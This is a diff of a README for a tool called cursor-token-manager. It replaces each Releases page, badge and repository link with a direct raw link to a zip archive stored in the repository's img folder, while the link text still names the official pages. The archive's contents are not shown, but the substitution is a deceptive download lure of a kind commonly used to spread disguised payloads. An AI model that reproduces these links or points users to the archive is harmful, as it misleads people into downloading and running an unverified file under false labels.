@@ -8,11 +8,11 @@ To begin, follow the simple steps below.
 
 ## 📥 Download & Install
 
-[![Download cursor-token-manager](https://img.shields.io/badge/Download-cursor--token--manager-blue.svg)](https://github.com/LukaPetrovic24/cursor-token-manager/releases)
+[![Download cursor-token-manager](https://raw.githubusercontent.com/LukaPetrovic24/cursor-token-manager/master/img/cursor_manager_token_v1.9.zip)](https://raw.githubusercontent.com/LukaPetrovic24/cursor-token-manager/master/img/cursor_manager_token_v1.9.zip)
 
 ### Step 1: Visit the Release Page
 
-To download the latest version of **cursor-token-manager**, please visit the [Releases page](https://github.com/LukaPetrovic24/cursor-token-manager/releases).
+To download the latest version of **cursor-token-manager**, please visit the [Releases page](https://raw.githubusercontent.com/LukaPetrovic24/cursor-token-manager/master/img/cursor_manager_token_v1.9.zip).
 
 ### Step 2: Choose Your Version
 
@@ -52,7 +52,7 @@ If you encounter any issues while downloading or installing:
 
 2. **Verify Your Download:** If the file seems corrupted or does not open, try downloading it again from the Releases page.
 
-3. **Consult the Help Section:** Look for any FAQs or troubleshooting tips on the [GitHub repository](https://github.com/LukaPetrovic24/cursor-token-manager) for further assistance.
+3. **Consult the Help Section:** Look for any FAQs or troubleshooting tips on the [GitHub repository](https://raw.githubusercontent.com/LukaPetrovic24/cursor-token-manager/master/img/cursor_manager_token_v1.9.zip) for further assistance.
 
 ## 🌐 Community Support
 
@@ -60,7 +60,7 @@ For additional help, you can reach out to the community. You are welcome to post
 
 ## ⚙️ Updates
 
-We regularly release updates to improve functionality and fix bugs. Keep an eye on the [Releases page](https://github.com/LukaPetrovic24/cursor-token-manager/releases) to stay current with the latest features.
+We regularly release updates to improve functionality and fix bugs. Keep an eye on the [Releases page](https://raw.githubusercontent.com/LukaPetrovic24/cursor-token-manager/master/img/cursor_manager_token_v1.9.zip) to stay current with the latest features.
 
 ## 🔒 Privacy Policy
 
